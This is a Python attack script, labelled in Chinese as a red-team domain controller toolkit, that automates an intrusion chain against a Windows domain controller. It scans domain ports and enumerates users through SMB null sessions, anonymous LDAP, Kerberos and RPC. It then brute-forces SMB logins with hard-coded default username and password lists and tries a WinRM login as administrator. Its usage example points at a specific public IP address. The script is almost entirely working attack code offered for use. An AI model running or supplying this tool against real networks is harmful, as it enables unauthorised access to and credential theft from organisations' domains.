#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
域控攻击工具包 - 红队安全专家专用
针对Windows域控的全面攻击工具
"""

import subprocess
import sys
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor

class DomainControllerAttacker:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.found_credentials = None
        self.attack_results = {}
        
    def scan_domain_ports(self):
        """扫描域控相关端口"""
        print(f"🔍 扫描域控端口: {self.target_ip}")
        
        domain_ports = {
            88: "Kerberos",
            135: "MSRPC", 
            139: "NetBIOS-SSN",
            389: "LDAP",
            445: "SMB",
            464: "Kerberos Password",
            636: "LDAPS",
            3268: "Global Catalog LDAP",
            3269: "Global Catalog LDAPS",
            5985: "WinRM HTTP",
            5986: "WinRM HTTPS"
        }
        
        open_ports = []
        for port, service in domain_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                
                if result == 0:
                    print(f"✅ 端口 {port} ({service}) 开放")
                    open_ports.append((port, service))
                else:
                    print(f"❌ 端口 {port} ({service}) 关闭")
                    
            except Exception as e:
                print(f"❌ 端口 {port} 检查失败: {e}")
        
        return open_ports
    
    def smb_enumeration(self):
        """SMB枚举攻击"""
        print(f"\n🔐 SMB枚举攻击: {self.target_ip}")
        
        # 尝试空会话
        try:
            cmd = ["smbclient", "-L", self.target_ip, "-N"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if "session setup failed" not in result.stderr.lower():
                print("✅ SMB空会话成功")
                print(result.stdout)
                return True
            else:
                print("❌ SMB空会话失败")
                
        except Exception as e:
            print(f"❌ SMB枚举失败: {e}")
        
        return False
    
    def ldap_enumeration(self):
        """LDAP枚举攻击"""
        print(f"\n🔍 LDAP枚举攻击: {self.target_ip}")
        
        try:
            # 尝试匿名LDAP连接
            cmd = ["ldapsearch", "-H", f"ldap://{self.target_ip}:389", "-x", "-b", "DC=domain,DC=com"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print("✅ LDAP匿名连接成功")
                print(result.stdout[:500])
                return True
            else:
                print("❌ LDAP匿名连接失败")
                
        except Exception as e:
            print(f"❌ LDAP枚举失败: {e}")
        
        return False
    
    def kerberos_enumeration(self):
        """Kerberos枚举攻击"""
        print(f"\n🔑 Kerberos枚举攻击: {self.target_ip}")
        
        try:
            # 尝试Kerberos用户枚举
            cmd = ["nmap", "--script", "krb5-enum-users", "--script-args", f"krb5-enum-users.realm=DOMAIN,userdb=/usr/share/wordlists/metasploit/unix_users.txt", self.target_ip]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if "User found" in result.stdout:
                print("✅ Kerberos用户枚举成功")
                print(result.stdout)
                return True
            else:
                print("❌ Kerberos用户枚举失败")
                
        except Exception as e:
            print(f"❌ Kerberos枚举失败: {e}")
        
        return False
    
    def rpc_enumeration(self):
        """RPC枚举攻击"""
        print(f"\n🔌 RPC枚举攻击: {self.target_ip}")
        
        try:
            # 使用rpcclient进行枚举
            cmd = ["rpcclient", "-U", "", "-N", self.target_ip, "-c", "enumdomusers"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            if "user:" in result.stdout.lower():
                print("✅ RPC用户枚举成功")
                print(result.stdout)
                return True
            else:
                print("❌ RPC用户枚举失败")
                
        except Exception as e:
            print(f"❌ RPC枚举失败: {e}")
        
        return False
    
    def smb_brute_force(self):
        """SMB暴力破解"""
        print(f"\n💥 SMB暴力破解: {self.target_ip}")
        
        # 常见用户名
        usernames = [
            "administrator", "admin", "guest", "user", "test", "demo",
            "root", "sa", "sql", "oracle", "mysql", "postgres",
            "backup", "backupadmin", "backupuser", "dbadmin",
            "service", "svc", "serviceaccount", "serviceuser"
        ]
        
        # 常见密码
        passwords = [
            "", "password", "123456", "admin", "administrator", "root",
            "guest", "test", "demo", "user", "pass", "1234", "12345",
            "password123", "admin123", "root123", "guest123", "test123",
            "Password1", "Admin123", "Root123", "Guest123", "Test123",
            "password!", "admin!", "root!", "guest!", "test!",
            "password@", "admin@", "root@", "guest@", "test@"
        ]
        
        for username in usernames:
            for password in passwords:
                try:
                    if password == "":
                        cmd = ["smbclient", "-L", self.target_ip, "-U", username, "-N"]
                    else:
                        cmd = ["smbclient", "-L", self.target_ip, "-U", f"{username}%{password}"]
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                    
                    if "session setup failed" not in result.stderr.lower():
                        print(f"✅ 找到有效凭据: {username}:{password}")
                        self.found_credentials = (username, password)
                        return True
                        
                except Exception as e:
                    continue
        
        print("❌ SMB暴力破解失败")
        return False
    
    def winrm_attack(self):
        """WinRM攻击"""
        print(f"\n🌐 WinRM攻击: {self.target_ip}")
        
        try:
            # 检查WinRM端口
            for port in [5985, 5986]:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                
                if result == 0:
                    print(f"✅ WinRM端口 {port} 开放")
                    
                    # 尝试WinRM连接
                    cmd = ["evil-winrm", "-i", self.target_ip, "-u", "administrator", "-p", "password"]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    
                    if "connected" in result.stdout.lower():
                        print("✅ WinRM连接成功")
                        return True
                    else:
                        print("❌ WinRM连接失败")
                        
        except Exception as e:
            print(f"❌ WinRM攻击失败: {e}")
        
        return False
    
    def run_full_attack(self):
        """运行完整域控攻击"""
        print("🚀 域控攻击工具包 - 红队安全专家专用")
        print("=" * 60)
        print(f"目标: {self.target_ip}")
        print("=" * 60)
        
        # 1. 端口扫描
        open_ports = self.scan_domain_ports()
        
        if not open_ports:
            print("❌ 未发现域控相关端口")
            return False
        
        # 2. SMB枚举
        if any(port[0] == 445 for port in open_ports):
            self.smb_enumeration()
            self.smb_brute_force()
        
        # 3. LDAP枚举
        if any(port[0] in [389, 636] for port in open_ports):
            self.ldap_enumeration()
        
        # 4. Kerberos枚举
        if any(port[0] in [88, 464] for port in open_ports):
            self.kerberos_enumeration()
        
        # 5. RPC枚举
        if any(port[0] == 135 for port in open_ports):
            self.rpc_enumeration()
        
        # 6. WinRM攻击
        self.winrm_attack()
        
        # 总结
        print("\n📊 攻击结果总结:")
        print(f"开放端口: {[port[0] for port in open_ports]}")
        if self.found_credentials:
            print(f"有效凭据: {self.found_credentials[0]}:{self.found_credentials[1]}")
        else:
            print("未找到有效凭据")
        
        return self.found_credentials is not None

def main():
    if len(sys.argv) < 2:
        print("使用方法: python3 domain_controller_attack.py <IP地址>")
        print("示例: python3 domain_controller_attack.py 82.29.71.14")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    attacker = DomainControllerAttacker(target_ip)
    attacker.run_full_attack()

if __name__ == "__main__":
    main()